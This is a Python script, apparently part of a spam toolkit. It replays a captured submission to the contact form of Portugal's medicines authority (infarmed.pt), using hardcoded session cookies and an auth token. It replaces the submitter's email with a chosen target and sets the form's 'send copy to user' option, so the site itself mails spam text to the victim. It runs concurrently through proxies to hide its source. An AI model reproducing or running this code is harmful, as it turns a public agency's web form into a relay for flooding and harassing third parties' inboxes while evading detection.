from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            'JSESSIONID': 'AFBB1C59148B6BE8D30EE1A3BC64EC6E',
            'COOKIE_SUPPORT': 'true',
            'GUEST_LANGUAGE_ID': 'en_GB',
            '_ga': 'GA1.2.740907868.1678095298',
            '_gid': 'GA1.2.1319748463.1678095298',
            '_gat': '1',
            'LFR_SESSION_STATE_258': '1678095731534',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryzAG6Cruk33dAHXhy',
            # 'Cookie': 'JSESSIONID=AFBB1C59148B6BE8D30EE1A3BC64EC6E; COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_GB; _ga=GA1.2.740907868.1678095298; _gid=GA1.2.1319748463.1678095298; _gat=1; LFR_SESSION_STATE_258=1678095731534',
            'Origin': 'https://www.infarmed.pt',
            'Pragma': 'no-cache',
            'Referer': 'https://www.infarmed.pt/web/infarmed-en/contact-us',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        params = {
            'p_p_id': '1_WAR_webformportlet_INSTANCE_18MbmBT10Wac',
            'p_p_lifecycle': '1',
            'p_p_state': 'normal',
            'p_p_mode': 'view',
            'p_p_col_id': 'column-1',
            'p_p_col_pos': '2',
            'p_p_col_count': '3',
            '_1_WAR_webformportlet_INSTANCE_18MbmBT10Wac_javax.portlet.action': 'saveData',
        }

        data = '------WebKitFormBoundaryzAG6Cruk33dAHXhy\r\nContent-Disposition: form-data; name="_1_WAR_webformportlet_INSTANCE_18MbmBT10Wac_formDate"\r\n\r\n1678095731697\r\n------WebKitFormBoundaryzAG6Cruk33dAHXhy\r\nContent-Disposition: form-data; name="_1_WAR_webformportlet_INSTANCE_18MbmBT10Wac_redirect"\r\n\r\n/web/infarmed-en/contact-us\r\n------WebKitFormBoundaryzAG6Cruk33dAHXhy\r\nContent-Disposition: form-data; name="_1_WAR_webformportlet_INSTANCE_18MbmBT10Wac_field1"\r\n\r\ntest\r\n------WebKitFormBoundaryzAG6Cruk33dAHXhy\r\nContent-Disposition: form-data; name="_1_WAR_webformportlet_INSTANCE_18MbmBT10Wac_field2"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryzAG6Cruk33dAHXhy\r\nContent-Disposition: form-data; name="_1_WAR_webformportlet_INSTANCE_18MbmBT10Wac_field3"\r\n\r\ntest\r\n------WebKitFormBoundaryzAG6Cruk33dAHXhy\r\nContent-Disposition: form-data; name="_1_WAR_webformportlet_INSTANCE_18MbmBT10Wac_sendCopyToUser"\r\n\r\ntrue\r\n------WebKitFormBoundaryzAG6Cruk33dAHXhy\r\nContent-Disposition: form-data; name="_1_WAR_webformportlet_INSTANCE_18MbmBT10Wac_sendCopyToUserCheckbox"\r\n\r\ntrue\r\n------WebKitFormBoundaryzAG6Cruk33dAHXhy\r\nContent-Disposition: form-data; name="_1_WAR_webformportlet_INSTANCE_18MbmBT10Wac_customEmailAddress"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryzAG6Cruk33dAHXhy\r\nContent-Disposition: form-data; name="p_auth"\r\n\r\nDDboA5ik\r\n------WebKitFormBoundaryzAG6Cruk33dAHXhy--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text()).encode()

        response = requests.post(
            'https://www.infarmed.pt/web/infarmed-en/contact-us',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=self.get_proxies(), timeout=20
        )
        return response


def main():
    s = 'success'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
